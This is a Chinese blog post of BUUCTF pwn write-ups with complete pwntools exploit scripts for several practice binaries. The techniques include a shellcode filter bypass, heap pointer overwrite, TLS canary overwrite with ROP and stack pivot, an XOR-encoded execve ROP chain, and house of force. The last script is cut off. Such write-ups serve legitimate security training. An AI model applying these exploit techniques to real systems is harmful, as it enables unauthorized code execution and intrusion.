<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="buu102-starctf_2019_babyshell 这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。 123456789101112from pwn import *# context.log_level &#x3D; &amp;#x27;debug&amp;#x27;context.arc">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf-pwn write-ups (13)">
<meta property="og:url" content="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:description" content="buu102-starctf_2019_babyshell 这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。 123456789101112from pwn import *# context.log_level &#x3D; &amp;#x27;debug&amp;#x27;context.arc">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/1.png">
<meta property="article:published_time" content="2023-03-25T09:14:12.000Z">
<meta property="article:modified_time" content="2024-01-31T09:21:03.995Z">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/1.png">

<link rel="canonical" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-cn'
  };
</script>

  <title>buuctf-pwn write-ups (13) | CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/25/buuctf-pwn-write-ups-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          buuctf-pwn write-ups (13)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-25 17:14:12" itemprop="dateCreated datePublished" datetime="2023-03-25T17:14:12+08:00">2023-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-31 17:21:03" itemprop="dateModified" datetime="2024-01-31T17:21:03+08:00">2024-01-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="buu102-starctf_2019_babyshell"><a class="markdownIt-Anchor" href="#buu102-starctf_2019_babyshell"></a> buu102-starctf_2019_babyshell</h1>
<p>这道题虽然说有一个check函数检查输入的shellcode是否全部都是白名单里面的字符，但实际上我们可以通过开头1个字符为\x00的指令来绕过这个检查，然后写入任意字符。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	sa(<span class="string">b&#x27;give me shellcode, plz:\n&#x27;</span>, <span class="string">b&#x27;\x00\x2f&#x27;</span> + asm(shellcraft.amd64.sh()))</span><br><span class="line">	io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu103-actf_2019_babyheap"><a class="markdownIt-Anchor" href="#buu103-actf_2019_babyheap"></a> buu103-actf_2019_babyheap</h1>
<p>一道简单的堆排布问题，错开分配到控制chunk，改函数指针，/bin/sh在程序中已经有了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26355</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">ita = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;Please input list index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line">binsh = <span class="number">0x602010</span></span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
<h1 id="buu193-starctf2018_babystack"><a class="markdownIt-Anchor" href="#buu193-starctf2018_babystack"></a> buu193-starctf2018_babystack</h1>
<p>这道题有一个<code>pthread_create</code>函数创建了一个新的线程，在这个线程中有一个很大的栈溢出。这里我们需要通过对程序内存空间的分析理解本题的利用思路。<br />
本题创建的线程的栈正好位于TLS结构体下面，TLS结构体位于libc加载基地址的前一页。记得TLS在house of emma中提到过，其中包含了canary的值，而本题中正好有canary，因此要溢出就必须溢出到覆盖canary的值。幸运的是，本题是可以实现的。<br />
我们可以通过ret2csu调用read函数写入一个one gadget到bss段中某处，然后通过调用puts函数获取到libc的基地址，最后进行栈迁移将rsp修改为写one gadget的地址，最后调用one gagdet。这里进行栈迁移的主要目的是确保栈空间的完全纯净，因为几乎所有的one gadget都要求栈中某个地方的值为0。另外此题不能通过调用<code>system</code>函数的方式getshell，因为此时我们已经覆盖了TLS结构体，无法成功调用system函数，而one gadget通常都是使用syscall指令来get shell的，因此没有影响。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25587</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">poprdi = <span class="number">0x400c03</span></span><br><span class="line">poprsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">leave_ret = <span class="number">0x400A9B</span></span><br><span class="line">poprbp = <span class="number">0x400870</span></span><br><span class="line">gad = <span class="number">0x400BFA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want to send?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x2000</span>).encode())</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(<span class="number">0</span>) + cyclic(<span class="number">4104</span> - <span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># canary</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(poprdi)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(gad)</span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)	<span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])	<span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)	<span class="comment"># pop r13</span></span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)	<span class="comment"># pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># pop r15</span></span><br><span class="line">payload += p64(<span class="number">0x400BE0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(poprbp)</span><br><span class="line">payload += p64(elf.bss() + <span class="number">0x400</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;goodbye.\n&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(base + <span class="number">0x4f322</span>) * <span class="number">4</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu194-ciscn_2019_s_8"><a class="markdownIt-Anchor" href="#buu194-ciscn_2019_s_8"></a> buu194-ciscn_2019_s_8</h1>
<p>这道题就是考ROP，一个静态编译，能够找到很多的gadget。下面使用的是<code>system('/bin/sh')</code>的方式。首先需要将字符串/bin/sh写到一个地方，通过对程序的逆向分析可以找到read函数的地址。输入完成之后就是调用syscall。尤其需要注意get shell的参数。第一个参数（rdi）保存字符串<code>/bin/sh</code>的地址，第二个参数（rsi）保存字符串<code>sh</code>的<strong>二重指针地址</strong>，注意是二重指针。因为<code>/bin/sh</code>里面已经有<code>sh</code>，所以直接可以偏移5个字符，不过我们传入rsi的值应该是保存有这个偏移5个字节的地址的地址，那么之前在写的时候就需要顺便写一个地址值。然后rdx赋值0即可。<br />
另外本题有一个函数会对输入进行处理，经过简单分析即可得知是为每个字节异或0x66，写gadget的时候异或一下就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25478</span>)</span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x4006e6</span></span><br><span class="line">poprsi = <span class="number">0x4040fe</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">poprsp = <span class="number">0x400d22</span></span><br><span class="line">poprax = <span class="number">0x449b9c</span></span><br><span class="line">poprbx = <span class="number">0x4005ee</span></span><br><span class="line">poprcx = <span class="number">0x400be2</span></span><br><span class="line">poprdx = <span class="number">0x449bf5</span></span><br><span class="line">pushrsp = <span class="number">0x482997</span>	<span class="comment"># call rdx</span></span><br><span class="line">poprsirbp = <span class="number">0x40f99e</span></span><br><span class="line">movrdirbp = <span class="number">0x422c45</span>	<span class="comment"># call rax</span></span><br><span class="line">syscall = <span class="number">0x44C177</span>	<span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">read = <span class="number">0x449be0</span></span><br><span class="line">bss = <span class="number">0x6BC300</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x90</span> + <span class="number">8</span> - <span class="number">8</span> * <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(pushrsp ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdi)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(bss - 0x300 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0x1000 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(7 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(0xA ^ 0x6666666666666666)</span></span><br><span class="line"><span class="comment"># payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(read ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += p64(poprax ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0x2 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0xbss ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprsi ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(poprdx ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0 ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(syscall ^ 0x6666666666666666)</span></span><br><span class="line"><span class="string">payload += p64(0) * 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(poprax ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(bss ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprsi ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64((bss + <span class="number">8</span>) ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(poprdx ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(<span class="number">0</span> ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line">payload += p64(syscall ^ <span class="number">0x6666666666666666</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Please enter your Password: &#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(bss + <span class="number">5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu104-wustctf2020_name_your_dog"><a class="markdownIt-Anchor" href="#buu104-wustctf2020_name_your_dog"></a> buu104-wustctf2020_name_your_dog</h1>
<p>整数溢出，往scanf.got里面写后门函数地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wustctf2020_name_your_dog&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;wustctf2020_name_your_dog&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27877</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Name for which?\n&gt;&#x27;</span>, <span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Give your name plz: &#x27;</span>, packing.p32(elf.symbols[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu105-gyctf_2020_force"><a class="markdownIt-Anchor" href="#buu105-gyctf_2020_force"></a> buu105-gyctf_2020_force</h1>
<p>从题目就可以看出考的是house of force，由于分配的chunk大小无限制，可分配很大的chunk，这类chunk会通过mmap分配，且会紧靠libc下面分配，由此可获得libc地址。然后在堆分配一个小chunk获取top chunk大小，同时0x50溢出修改top chunk的size，分配超大chunk让top chunk到<code>__malloc_hook</code>，这样就能够在<code>__malloc_hook</code>分配，考虑到内存对齐问题，还需要跳到<code>__realloc_hook</code>进行处理。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span 